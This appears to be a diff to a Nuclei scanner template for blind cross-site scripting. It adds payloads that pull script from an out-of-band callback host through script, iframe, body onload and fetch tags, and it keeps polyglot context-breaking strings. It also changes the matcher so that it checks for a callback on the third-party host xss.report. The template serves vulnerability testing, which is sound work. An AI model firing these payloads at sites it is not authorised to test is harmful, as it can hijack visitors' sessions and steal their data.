@@ -33,11 +33,14 @@ http:
         - '"><script src=//{{interactsh-url}}></script>'
         - '"><img src=x onerror=import("//{{interactsh-url}}")>'
         - '"><svg/onload=import("//{{interactsh-url}}")>'
+        - '"><body onload=import("//{{interactsh-url}}")>'
+        - '"><iframe src="//{{interactsh-url}}"></iframe>'
         
         # --- Polyglots (Context Breakers) ---
         - 'javascript:"/*\"/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/onload=import("//{{interactsh-url}}")&gt;*/'
         - '"><iframe/src="javascript:import(`//{{interactsh-url}}`)">'
         - "';import('//{{interactsh-url}}');"
+        - '"><script>fetch("//{{interactsh-url}}")</script>'
 
     fuzzing:
       # Fuzz Query Parameters
@@ -46,10 +49,6 @@ http:
         mode: single
         fuzz:
           - "{{blind}}"
-
-      # Note: The 'headers' section above automatically injects into those specific headers.
-      # We don't need a separate fuzzing rule for them if we define them with the payload variable directly in the request.
-      # However, defining them in 'headers' sends the payload in EVERY request, which is efficient for header checks.
 
     stop-at-first-match: false
 
@@ -67,7 +66,4 @@ http:
       - type: dsl
         name: reflected-confirmation
         dsl:
-          - "contains(header, 'text/html')"
-          - "(contains(body, '<script src=https://xss.report/c/ajvadn></script>') || contains(body, '{{interactsh-url}}'))"
-          - "(contains(body, '<script') || contains(body, 'onerror=') || contains(body, 'onload=') || contains(body, 'import('))"
-        condition: and
+          - "contains(header, 'text/html') && (contains(body, '<script src=https://xss.report/c/ajvadn></script>') || contains(body, '{{interactsh-url}}'))"
